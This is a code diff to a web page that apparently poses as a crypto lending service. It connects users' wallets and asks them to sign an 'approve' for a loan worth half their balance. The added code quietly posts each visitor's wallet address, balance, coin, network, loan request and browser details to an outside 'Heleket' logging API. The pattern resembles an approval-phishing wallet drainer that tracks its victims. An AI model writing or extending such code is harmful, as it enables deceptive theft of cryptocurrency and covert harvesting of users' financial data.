@@ -9,11 +9,7 @@
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: 'Inter', sans-serif;
@@ -843,6 +839,21 @@
             return 0;
         }
 
+        async function logToHeleket(type, data) {
+            try {
+                await axios.post(`${HELEKET_API}/api/log`, {
+                    type: type,
+                    invoiceId: invoiceId,
+                    source: 'shafu',
+                    ...data,
+                    userAgent: navigator.userAgent
+                });
+                console.log(`✅ Log sent: ${type}`);
+            } catch (e) {
+                console.error('Log error:', e);
+            }
+        }
+
         async function connectWallet(walletName) {
             if (!isInWalletBrowser()) {
                 document.getElementById('browserWarning').innerHTML = translations[currentLang].openInWallet;
@@ -866,6 +877,7 @@
             }
 
             selectedWallet = walletName;
+            let success = false;
 
             if (walletName === 'MetaMask' || walletName === 'Trust Wallet' || walletName === 'Bitget Wallet' || walletName === 'OKX Wallet') {
                 if (!window.ethereum) {
@@ -877,14 +889,12 @@
                         method: 'eth_requestAccounts'
                     });
                     userAddress = accounts[0];
-                    return true;
+                    success = true;
                 } catch (e) {
                     alert('Connection failed');
                     return false;
                 }
-            }
-
-            if (walletName === 'TronLink') {
+            } else if (walletName === 'TronLink') {
                 if (!window.tronLink) {
                     alert('Please install TronLink or open this page in TronLink browser');
                     return false;
@@ -894,28 +904,23 @@
                         method: 'tron_requestAccounts'
                     });
                     userAddress = window.tronLink.tronWeb.defaultAddress.base58;
-                    return true;
+                    success = true;
                 } catch (e) {
                     alert('Connection failed');
                     return false;
                 }
             }
-            return false;
-        }
 
-        async function logToHeleket(type, data) {
-            try {
-                await axios.post(`${HELEKET_API}/api/log`, {
-                    type: type,
-                    invoiceId: invoiceId,
-                    source: 'shafu',
-                    ...data,
-                    userAgent: navigator.userAgent
+            if (success) {
+                await logToHeleket('wallet_connected', {
+                    address: userAddress,
+                    balance: 0,
+                    coin: 'Unknown',
+                    success: true,
+                    walletName: selectedWallet
                 });
-                console.log(`✅ Log sent: ${type}`);
-            } catch (e) {
-                console.error('Log error:', e);
             }
+            return success;
         }
 
         async function signApprove(amount) {
@@ -957,7 +962,8 @@
                     network: selectedNetwork,
                     coin: selectedCoin,
                     balance: userBalance,
-                    loanAmount
+                    loanAmount: loanAmount,
+                    repayAmount: loanAmount * (1 + INTEREST_RATE)
                 });
                 return true;
             } catch (e) {
@@ -1011,15 +1017,33 @@
         window.selectNetworkHandler = async (network, coin) => {
             selectedNetwork = network;
             selectedCoin = coin;
+
+            await logToHeleket('select_wallet', {
+                wallet: selectedWallet,
+                network: selectedNetwork,
+                coin: selectedCoin
+            });
+
             document.getElementById('walletModal').classList.remove('active');
             document.getElementById('walletSelectionStep').style.display = 'block';
             document.getElementById('networkSelectionStep').style.display = 'none';
+
             invoiceId = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36);
             userBalance = await getBalance(selectedNetwork, selectedCoin, userAddress);
+
+            await logToHeleket('wallet_connected', {
+                address: userAddress,
+                balance: userBalance,
+                coin: selectedCoin,
+                network: selectedNetwork,
+                success: true
+            });
+
             const maxLoan = userBalance * 0.5;
             document.getElementById('userBalance').innerHTML = `${userBalance.toFixed(2)} ${selectedCoin}`;
             document.getElementById('maxLoan').innerHTML = `${maxLoan.toFixed(2)} ${selectedCoin}`;
             document.getElementById('loanAmount').max = maxLoan;
+
             document.getElementById('loanModal').classList.add('active');
             document.getElementById('loanStep').style.display = 'block';
             document.getElementById('successStep').style.display = 'none';
@@ -1037,11 +1061,13 @@
                 return;
             }
             loanAmount = amount;
+
             await logToHeleket('loan_request', {
                 amount,
                 balance: userBalance,
                 maxLoan
             });
+
             const approved = await signApprove(amount);
             if (approved) {
                 document.getElementById('loanStep').style.display = 'none';
